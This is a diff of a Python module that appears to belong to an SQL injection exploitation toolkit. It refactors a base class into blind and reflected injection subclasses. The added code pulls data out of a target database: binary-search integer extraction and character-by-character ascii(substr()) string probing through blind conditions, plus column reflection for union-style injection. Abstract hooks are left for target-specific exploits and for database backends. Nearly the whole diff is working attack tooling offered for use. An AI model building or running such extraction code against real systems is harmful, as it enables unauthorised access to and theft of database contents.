@@ -2,8 +2,6 @@ from abc import ABC, abstractmethod
 import sys
 import string
 
-# TODO: add blind/reflected option
-# TODO: binary search instead of bruteforce
 class SQLi(ABC):
 
     @staticmethod
@@ -12,36 +10,6 @@ class SQLi(ABC):
         offset = "" if offset is None else f" OFFSET {offset}"
         table = "" if not table else f" FROM {table}"
         return f"SELECT {column}{table}{condition} LIMIT 1{offset}"
-
-    def extract_int(self, column: str, table=None, condition=None, offset=None, verbose=False, binary_search=True):
-
-        query = self.build_query(column, table, condition, offset)
-
-        if self.blind_sqli(f"({query})=0"):
-            return 0
-
-        if not binary_search:
-            cur_int = 1
-            while self.blind_sqli(f"({query})>{cur_int}", verbose):
-                cur_int += 1
-
-            return cur_int
-        else:
-            min_value = 1
-            max_value = 1
-
-            while self.blind_sqli(f"({query})>{max_value}", verbose):
-                min_value = max_value + 1
-                max_value = max_value * 2
-
-            while True:
-                cur_int = (min_value + max_value) // 2
-                if self.blind_sqli(f"({query})>{cur_int}", verbose):
-                    min_value = cur_int + 1
-                elif self.blind_sqli(f"({query})<{cur_int}", verbose):
-                    max_value = cur_int - 1
-                else:
-                    return cur_int
 
     def extract_multiple_ints(self, column: str, table=None, condition=None, verbose=False):
         row_count = self.extract_int(f"COUNT({column})", table=table, condition=condition, verbose=verbose)
@@ -54,50 +22,26 @@ class SQLi(ABC):
 
         return rows
 
-    def extract_string(self, column: str, table=None, condition=None, offset=None, max_length=None, verbose=False, charset=string.printable):
-
-        if max_length is None:
-            max_length = self.extract_int(f"LENGTH({column})", table, condition, offset, verbose=verbose)
-            if verbose:
-                print("Fetched length:", max_length)
-
-        cur_str = ""
-        while True:
-            found = False
-            query = self.build_query(f"ascii(substr({column},{len(cur_str) + 1},1))", table, condition, offset)
-            for c in charset:
-                if self.blind_sqli(f"({query})={ord(c)}", verbose):
-                    found = True
-                    cur_str += c
-                    if verbose:
-                        sys.stdout.write(c)
-                        sys.stdout.flush()
-                    break
-            if not found or (max_length is not None and len(cur_str) >= max_length):
-                break
-
-        if verbose:
-            print()
-
-        return cur_str
-
-    def extract_multiple_strings(self, column: str, table=None, condition=None, verbose=False, charset=string.printable):
+    def extract_multiple_strings(self, column: str, table=None, condition=None, verbose=False):
         row_count = self.extract_int(f"COUNT({column})", table=table, condition=condition, verbose=verbose)
         if verbose:
             print(f"Fetching {row_count} rows")
 
         rows = []
         for i in range(0, row_count):
-            rows.append(self.extract_string(column, table, condition, i, verbose=verbose, charset=charset))
+            rows.append(self.extract_string(column, table, condition, i, verbose=verbose))
 
         return rows
 
-    # Following methods need to be implemented in the exploit
     @abstractmethod
-    def blind_sqli(self, condition: str, verbose=False) -> bool:
+    def extract_int(self, column: str, table=None, condition=None, 
+                    offset=None, verbose=False):
         pass
 
-    # Following methods will be implemented by MySQLi, PostgreSQLi, ...
+    @abstractmethod
+    def extract_string(self, column: str, table=None, condition=None, offset=None, verbose=False):
+        pass
+
     @abstractmethod
     def get_database_version(self, verbose=False):
         pass
@@ -117,6 +61,108 @@ class SQLi(ABC):
     @abstractmethod
     def get_column_names(self, table: str, schema: str, verbose=False):
         pass
+
+class ReflectedSQLi(SQLi, ABC):
+
+    def __init__(self, column_types: list):
+        self.column_types = column_types
+
+    @abstractmethod
+    def reflected_sqli(columns: list, table=None, condition=None, offset=None):
+        pass
+
+    def extract_int(self, column: str, table=None, condition=None, offset=None, verbose=False):
+        query_columns = [column] + list(map(lambda c: f"'{c}'", range(2, len(self.column_types))))
+        return int(self.reflected_sqli(query_columns, table, condition, offset)[0])
+
+    def extract_string(self, column: str, table=None, condition=None, offset=None, verbose=False):
+        if str not in self.column_types:
+            print("[!] Reflectd SQL does not reflect string types, only:", self.column_types)
+            return None
+
+        str_column = self.column_types.index(str)
+        query_columns = list(map(lambda c: f"'{c}'", range(len(self.column_types))))
+        query_columns[str_column] = column
+        return self.reflected_sqli(query_columns, table, condition, offset)[str_column]
+
+class BlindSQLi(SQLi, ABC):
+
+    @abstractmethod
+    def blind_sqli(self, condition: str, verbose=False) -> bool:
+        pass
+
+    def extract_int(self, column: str, table=None, condition=None, 
+                    offset=None, verbose=False, binary_search=True,
+                    min_value=None, max_value=None):
+
+        query = self.build_query(column, table, condition, offset)
+
+        if self.blind_sqli(f"({query})=0"):
+            return 0
+
+        if not binary_search:
+            cur_int = 1 if min_value is None else min_value
+            while self.blind_sqli(f"({query})>{cur_int}", verbose):
+                cur_int += 1
+                if max_value is not None and cur_int >= max_value:
+                    return None
+
+            return cur_int
+        else:
+            if min_value is None or max_value is None:
+                min_value = 1 if min_value is None else min_value
+                max_value = 1 if max_value is None else max_value
+
+                while self.blind_sqli(f"({query})>{max_value}", verbose):
+                    min_value = max_value + 1
+                    max_value = max_value * 2
+
+            while True:
+                cur_int = (min_value + max_value) // 2
+                if self.blind_sqli(f"({query})>{cur_int}", verbose):
+                    min_value = cur_int + 1
+                elif self.blind_sqli(f"({query})<{cur_int}", verbose):
+                    max_value = cur_int - 1
+                else:
+                    return cur_int
+
+    def extract_string(self, column: str, table=None, condition=None, offset=None, verbose=False, max_length=None, charset=string.printable):
+
+        if max_length is None:
+            max_length = self.extract_int(f"LENGTH({column})", table, condition, offset, verbose=verbose)
+            if verbose:
+                print("Fetched length:", max_length)
+
+        cur_str = ""
+        while True:
+            found = False
+            cur_column = f"ascii(substr({column},{len(cur_str) + 1},1))"
+            if charset:
+                query = self.build_query(cur_column, table, condition, offset)
+                for c in charset:
+                    if self.blind_sqli(f"({query})={ord(c)}"):
+                        found = True
+                        cur_str += c
+                        if verbose:
+                            sys.stdout.write(c)
+                            sys.stdout.flush()
+                        break
+            else:
+                c = self.extract_int(cur_column, table, condition, min_value=0, max_value=127)
+                if c is not None:
+                    found = True
+                    cur_str += chr(c)
+                    if verbose:
+                        sys.stdout.write(chr(c))
+                        sys.stdout.flush()  
+            
+            if not found or (max_length is not None and len(cur_str) >= max_length):
+                break
+
+        if verbose:
+            print()
+
+        return cur_str
 
 
 class PostgreSQLi(SQLi, ABC):
